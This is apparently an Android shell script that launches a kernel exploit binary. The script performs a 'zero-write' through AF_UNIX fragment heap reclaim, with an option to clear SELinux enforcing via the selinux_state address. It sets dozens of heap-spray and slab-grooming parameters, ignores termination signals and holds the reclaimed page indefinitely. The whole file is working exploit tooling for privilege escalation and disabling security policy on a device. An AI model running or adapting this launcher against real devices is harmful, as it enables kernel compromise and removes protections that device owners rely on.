#!/system/bin/sh
# zero.sh <name> <target> [selinux]
#
# One full zero-write attempt with the AF_UNIX 8K-frag reclaim.  On success
# the exploit prints "[zero] target=..." and parks forever (it holds the
# reclaimed page); the caller watches zero-<name>.log and must never kill it.
#
# selinux=1 means <target> is the runtime selinux_state address: the exploit
# shifts it to state-7 itself and only `enforcing` is cleared.  Never pass an
# unadjusted state with selinux=0 -- that clears `initialized` and unlabels
# /data (2026-10-29 incident).
trap '' HUP INT TERM
D=${KIT_DIR:-/data/local/tmp/ic-kit}
BIN="$D/ic-timer"
NAME=$1
T=$2
SEL=${3:-0}
[ -n "$NAME" ] && [ -n "$T" ] || { echo "[zero] usage: zero.sh name target [selinux]"; exit 1; }
LOG="$D/zero-$NAME.log"
: > "$LOG"

exec env PATH=/sbin:/system/bin:/system/xbin \
    IC_PEAK=1 \
    IC_FORK=1 \
    IC_REVERSE=1 \
    IC_PC=0 \
    IC_PEAK_SKBF=1 \
    IC_KEEP_POOL=1 \
    IC_SKB_MIN=8 \
    IC_AIO_NOFAULT=1 \
    IC_AIO_NOREMAP=1 \
    IC_ANON_PAGES=0 \
    IC_AIO_EVENTS=1 \
    IC_VMA_KEEP=10 \
    IC_AIO_CTXS=16384 \
    IC_VMA_PREWARM=16384 \
    IC_STAGING_DIR="$D/ic-stage" \
    IC_FILP_SHIELD=18000 \
    IC_KM64_SHIELD=4096 \
    IC_ATTEMPT_WAIT=900 \
    IC_ATTEMPTS="${ZERO_ATTEMPTS:-6}" \
    IC_SAFE_FILL=4000 \
    IC_SLABTRACE=1 \
    IC_PAD_ALIGN=1 \
    IC_PAD_KEEP=4185 \
    IC_FLUSH_SPARSE=15 \
    IC_SPRAY_EARLY=1 \
    IC_EARLY_PRIME=1024 \
    IC_EARLY_WAIT=1 \
    IC_EARLY_GATE=1 \
    IC_SKB_SOCKS=8 \
    IC_SPRAY=unixstr \
    IC_UNXSTR_MSGS=8192 \
    IC_ZERO_TARGET="$T" \
    IC_ZERO_SELINUX="$SEL" \
    "$BIN" >> "$LOG" 2>&1
